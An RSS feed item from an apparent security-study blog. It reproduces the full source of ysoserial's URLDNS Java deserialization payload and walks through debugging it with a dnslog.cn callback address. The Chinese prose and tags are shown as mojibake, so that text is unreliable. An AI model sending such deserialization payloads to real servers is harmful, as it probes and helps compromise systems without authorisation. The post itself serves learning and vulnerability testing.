<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>Milkii0çš„ç§˜å¯†èŠ±å›­ â€¢ Posts by &#34;ysoserialè°ƒè¯•&#34; tag</title>
        <link>http://example.com</link>
        <description></description>
        <language>en</language>
        <pubDate>Wed, 25 Aug 2021 11:38:45 +0800</pubDate>
        <lastBuildDate>Wed, 25 Aug 2021 11:38:45 +0800</lastBuildDate>
        <category>CodeQL</category>
        <category>codeql, æ­å»ºæ•™ç¨‹</category>
        <category>web,HTTP</category>
        <category>redis,æœªæˆæƒ,æ¼æ´åˆ©ç”¨</category>
        <category>solr, æ¼æ´å¤ç°</category>
        <category>solr, ä»£ç å®¡è®¡</category>
        <category>å‰åç«¯åˆ†ç¦»</category>
        <category>æ–‡ä»¶ä¸Šä¼ é¶åœº</category>
        <category>Javaååºåˆ—åŒ–</category>
        <category>ysoserialè°ƒè¯•</category>
        <category>æœ¨é©¬,æ±‡æ€»</category>
        <category>pikachu,webé¶åœº</category>
        <category>dorabox,é¶åœºç»ƒä¹ </category>
        <category>sqlæ³¨å…¥é¶åœº</category>
        <category>webgoat</category>
        <item>
            <guid isPermalink="true">http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/</guid>
            <title>ysoserialä¹‹URLDNSè°ƒè¯•</title>
            <link>http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/</link>
            <category>ysoserialè°ƒè¯•</category>
            <pubDate>Wed, 25 Aug 2021 11:38:45 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;åˆ©ç”¨é“¾ç®€è¿°&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#åˆ©ç”¨é“¾ç®€è¿°&#34;&gt;#&lt;/a&gt; åˆ©ç”¨é“¾ç®€è¿°&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;è§¦å‘ç»“æœä¸ºä¸€æ¬¡ DNS è¯·æ±‚ï¼Œé€‚ç”¨ç›®æ ‡æ— å›æ˜¾æƒ…å†µ&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨ java å†…ç½®ç±»æ„é€ ï¼Œæ— ç¬¬ä¸‰æ–¹åº“ä¾èµ–&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;urldnsåˆ©ç”¨ä»£ç &#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#urldnsåˆ©ç”¨ä»£ç &#34;&gt;#&lt;/a&gt; URLDNS åˆ©ç”¨ä»£ç &lt;/h1&gt;
&lt;p&gt;pocï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;package&lt;/span&gt; ysoserial.payloads;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.io.IOException;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.net.InetAddress;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.net.URLConnection;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.net.URLStreamHandler;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.util.HashMap;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.net.URL;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; ysoserial.payloads.annotation.Authors;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; ysoserial.payloads.annotation.Dependencies;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; ysoserial.payloads.annotation.PayloadTest;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; ysoserial.payloads.util.PayloadRunner;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; ysoserial.payloads.util.Reflections;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/**&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; * A blog post with more details about this gadget chain is at the url below:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   This was inspired by  Philippe Arteau &lt;span class=&#34;doctag&#34;&gt;@h&lt;/span&gt;3xstream, who wrote a blog&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   posting describing how he modified the Java Commons Collections gadget&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   in ysoserial to open a URL. This takes the same idea, but eliminates&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   the dependency on Commons Collections and does a DNS lookup with just&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   standard JDK classes.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   The Java URL class has an interesting property on its equals and&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   hashCode methods. The URL class will, as a side effect, do a DNS lookup&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   during a comparison (either equals or hashCode).&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   As part of deserialization, HashMap calls hashCode on each key that it&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   deserializes, so using a Java URL object as a serialized key allows&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   it to trigger a DNS lookup.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *   Gadget Chain:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *     HashMap.readObject()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *       HashMap.putVal()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *         HashMap.hash()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *           URL.hashCode()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; *&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@SuppressWarnings(&amp;#123; &amp;quot;rawtypes&amp;quot;, &amp;quot;unchecked&amp;quot; &amp;#125;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@PayloadTest(skip = &amp;quot;true&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@Dependencies()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@Authors(&amp;#123; Authors.GEBL &amp;#125;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;URLDNS&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;ObjectPayload&lt;/span&gt;&amp;lt;&lt;span class=&#34;title&#34;&gt;Object&lt;/span&gt;&amp;gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; Object &lt;span class=&#34;title&#34;&gt;getObject&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; String url)&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; Exception &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;comment&#34;&gt;//Avoid DNS resolution during payload creation&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;comment&#34;&gt;//Since the field &amp;lt;code&amp;gt;java.net.URL.handler&amp;lt;/code&amp;gt; is transient, it will not be part of the serialized payload.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                URLStreamHandler handler = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; SilentURLStreamHandler();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                HashMap ht = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; HashMap(); &lt;span class=&#34;comment&#34;&gt;// HashMap that will contain the URL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                URL u = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; URL(&lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;, url, handler); &lt;span class=&#34;comment&#34;&gt;// URL to use as the Key&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                ht.put(u, url); &lt;span class=&#34;comment&#34;&gt;//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                Reflections.setFieldValue(u, &lt;span class=&#34;string&#34;&gt;&amp;quot;hashCode&amp;quot;&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;// During the put above, the URL&amp;#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ht;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; String[] args)&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; Exception &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                PayloadRunner.run(URLDNS.class, args);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;/**&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         * &amp;lt;p&amp;gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         * using the serialized object.&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         *&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         * &amp;lt;b&amp;gt;Potential false negative:&amp;lt;/b&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         * &amp;lt;p&amp;gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         * second resolution.&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;         */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;SilentURLStreamHandler&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;URLStreamHandler&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; URLConnection &lt;span class=&#34;title&#34;&gt;openConnection&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(URL u)&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; IOException &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;synchronized&lt;/span&gt; InetAddress &lt;span class=&#34;title&#34;&gt;getHostAddress&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(URL u)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;é“¾æ¥ï¼š&lt;a href=&#34;https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java&#34;&gt;https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;è°ƒè¯•åˆ†æ&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#è°ƒè¯•åˆ†æ&#34;&gt;#&lt;/a&gt; è°ƒè¯•åˆ†æ&lt;/h1&gt;
&lt;p&gt;é¡¹ç›®é“¾æ¥ï¼š&lt;a href=&#34;https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar&#34;&gt;https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;æ‰“å¼€ ideaï¼Œæ‰¾åˆ° URLDNS å…¥å£ï¼šysosertial-&amp;gt;src-&amp;gt;main-&amp;gt;java-&amp;gt;ysoserial-&amp;gt;payloads-&amp;gt;URLDNS.java-&amp;gt;main ()&lt;/p&gt;
&lt;h2 id=&#34;è¿è¡Œå°è¯•&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#è¿è¡Œå°è¯•&#34;&gt;#&lt;/a&gt; è¿è¡Œå°è¯•&lt;/h2&gt;
&lt;p&gt;ç›´æ¥è¿è¡Œ main å‡½æ•°ï¼Œå‘ç°é»˜è®¤ä¼ å…¥çš„å‘½ä»¤ä¸º calc.exe&lt;/p&gt;
&lt;p&gt;æŠ¥é”™ï¼šURL åˆå§‹åŒ–å¤±è´¥ï¼Œæ‰¾ä¸åˆ° calc.exe åè®®&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;æœ€åä¸€è¡ŒæŠ¥é”™ä¿¡æ¯æŒ‡å‘ main å‡½æ•°ï¼Œå€’æ•°ç¬¬äºŒè¡ŒæŠ¥é”™ä¿¡æ¯æŒ‡å‘ PayloadRunner&lt;/p&gt;
&lt;p&gt;è¯´æ˜ä¸ºä¼ å…¥å‚æ•° args æœ‰è¯¯ï¼Œåº”ä¸º URLï¼Œä¹Ÿæ˜¯æˆ‘ä»¬è¦å‘é€è¯·æ±‚çš„åœ°å€&lt;/p&gt;
&lt;p&gt;æ‰“å¼€ dnslogï¼Œè·å–åˆ°åœ°å€ä¸ºï¼š&lt;a href=&#34;http://ghtzjz.dnslog.cn&#34;&gt;ghtzjz.dnslog.cn&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç¼–è¾‘ä¼ å…¥å‚æ•°ï¼Œ&lt;a href=&#34;http://ghtzjz.dnslog.cn&#34;&gt;http://ghtzjz.dnslog.cn&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;4.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;å†æ¬¡è¿è¡Œ main ()ï¼Œpayload ä¸ºæˆ‘ä»¬ä¼ å…¥çš„å‚æ•°&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;5.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
